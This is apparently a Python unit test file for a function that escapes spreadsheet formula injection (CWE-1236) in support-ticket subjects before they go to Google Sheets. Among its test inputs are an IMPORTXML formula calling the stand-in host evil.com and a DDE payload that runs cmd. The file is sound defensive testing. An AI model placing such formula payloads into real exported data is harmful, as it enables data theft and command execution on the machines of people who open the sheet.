"""Unit tests for support security features.

Tests for:
- Google Sheets formula injection prevention (CWE-1236)
"""

from app.services.google_workspace_service import sanitise_for_sheets


class TestSheetsSanitisation:
    """Test Google Sheets formula injection prevention."""

    def test_formula_equals_prefix(self):
        """Formulas starting with = are escaped."""
        assert sanitise_for_sheets("=1+1") == "'=1+1"
        assert sanitise_for_sheets("=SUM(A1:A10)") == "'=SUM(A1:A10)"
        assert (
            sanitise_for_sheets("=IMPORTXML('http://evil.com','//x')")
            == "'=IMPORTXML('http://evil.com','//x')"
        )

    def test_formula_plus_prefix(self):
        """Formulas starting with + are escaped."""
        assert sanitise_for_sheets("+1") == "'+1"
        assert sanitise_for_sheets("+SUM(A1:A10)") == "'+SUM(A1:A10)"

    def test_formula_minus_prefix(self):
        """Formulas starting with - are escaped."""
        assert sanitise_for_sheets("-1") == "'-1"
        assert sanitise_for_sheets("-A1") == "'-A1"

    def test_formula_at_prefix(self):
        """Formulas starting with @ are escaped."""
        assert sanitise_for_sheets("@SUM(A1)") == "'@SUM(A1)"

    def test_control_character_tab(self):
        """Tab character at start is escaped."""
        assert sanitise_for_sheets("\t=1+1") == "'\t=1+1"

    def test_control_character_carriage_return(self):
        """Carriage return at start is escaped."""
        assert sanitise_for_sheets("\r=1+1") == "'\r=1+1"

    def test_control_character_newline(self):
        """Newline at start is escaped."""
        assert sanitise_for_sheets("\n=1+1") == "'\n=1+1"

    def test_normal_text_unchanged(self):
        """Normal text is not modified."""
        assert sanitise_for_sheets("Hello world") == "Hello world"
        assert (
            sanitise_for_sheets("Bug report: login fails") == "Bug report: login fails"
        )
        assert sanitise_for_sheets("test@example.com") == "test@example.com"
        assert (
            sanitise_for_sheets("Technical issue with AWS")
            == "Technical issue with AWS"
        )

    def test_empty_string(self):
        """Empty string returns empty."""
        assert sanitise_for_sheets("") == ""

    def test_mid_string_formula_chars(self):
        """Formula chars in middle of string are not escaped."""
        assert sanitise_for_sheets("2+2=4") == "2+2=4"
        assert sanitise_for_sheets("user@domain.com") == "user@domain.com"
        assert sanitise_for_sheets("a-b+c") == "a-b+c"
        assert sanitise_for_sheets("test=value") == "test=value"

    def test_realistic_support_ticket_subjects(self):
        """Realistic support ticket subjects are handled correctly."""
        # Normal subjects - should not be escaped
        assert (
            sanitise_for_sheets("Can't login to my account")
            == "Can't login to my account"
        )
        assert (
            sanitise_for_sheets("Billing question about Pro tier")
            == "Billing question about Pro tier"
        )
        assert (
            sanitise_for_sheets("AWS scanner not finding detections")
            == "AWS scanner not finding detections"
        )

        # Malicious subjects - should be escaped
        assert sanitise_for_sheets("=cmd|' /C calc'!A0") == "'=cmd|' /C calc'!A0"
        assert sanitise_for_sheets("+1234567890") == "'+1234567890"

    def test_unicode_text(self):
        """Unicode text is handled correctly."""
        assert sanitise_for_sheets("Hello 世界") == "Hello 世界"
        assert sanitise_for_sheets("Ça ne marche pas") == "Ça ne marche pas"
        assert sanitise_for_sheets("=世界") == "'=世界"

    def test_multiline_description(self):
        """Multiline descriptions starting with normal text are not escaped."""
        description = (
            "This is a bug report.\n\nSteps to reproduce:\n1. Login\n2. Click scan"
        )
        assert sanitise_for_sheets(description) == description

    def test_multiline_starting_with_formula(self):
        """Multiline text starting with formula char is escaped."""
        malicious = "=SUM(A1:A10)\nThis looks like a normal description"
        assert (
            sanitise_for_sheets(malicious)
            == "'=SUM(A1:A10)\nThis looks like a normal description"
        )
